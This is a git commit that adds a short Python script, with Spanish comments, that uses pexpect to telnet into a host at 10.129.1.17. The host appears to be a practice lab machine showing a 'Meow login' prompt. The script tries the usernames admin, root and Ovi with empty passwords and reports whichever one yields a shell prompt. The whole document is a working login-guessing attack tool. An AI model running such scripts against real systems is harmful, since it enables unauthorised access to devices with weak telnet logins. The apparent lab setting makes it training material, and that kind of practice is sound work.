fef4752267a8e2056eb0b1345807ef52c31b9c88
Kl3lCrypt <klelcrypt@gmail.com>
2025-07-01 18:27:09 +0200

    telnet_fuzzer
    Fuzzing telnet services

---
+++ tel.py
@@ -0,0 +1,72 @@
+#!/usr/bin/env python3
+
+import signal
+import pexpect
+import sys
+
+def def_handler(sig,frame):
+    print("Saliendo del programa...")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+HOST= "10.129.1.17"
+users = ["admin", "root", "Ovi"]
+
+for user in users:
+    try:
+        print(f"Probando acceso sin contraseña para {user}")
+        # Lanzar telnet a HOST
+        child = pexpect.spawn(f"telnet {HOST}", timeout=7)
+        # Esperando el pront de login
+        child.expect(r"Meow login: ?", timeout=15)
+        # Enviar Usuario
+        child.sendline(user)
+
+        index = child.expect(
+            [
+                r"Meow login: ?",
+                r"Password: ?",
+                r"[$#]"
+            ],
+            timeout=5
+        )
+
+        if index == 1:
+            child.sendline("")
+            index2 = child.expect(
+                [
+                    r"Meow login: ?",
+                    r"Login incorrect",
+                    r"[$#]"
+                ],
+                timeout=5
+            )
+            if index2 == 2:
+                print(f"[+] Acceso con el usuario {user}\n")
+                child.sendline("exit")
+                child.close()
+                break
+            else:
+                print(f"[!] El usuario {user} no es valido sin contraseña\n ")
+                child.close()
+        elif index == 2:
+            print(f"[+] El usuario {user} es valido!")
+            child.sendline("exit")
+            child.close()
+            break
+        else:
+            print(f"[!] Fallo con el ususario {user}")
+            child.close()
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+
+
+
+
+
+
+
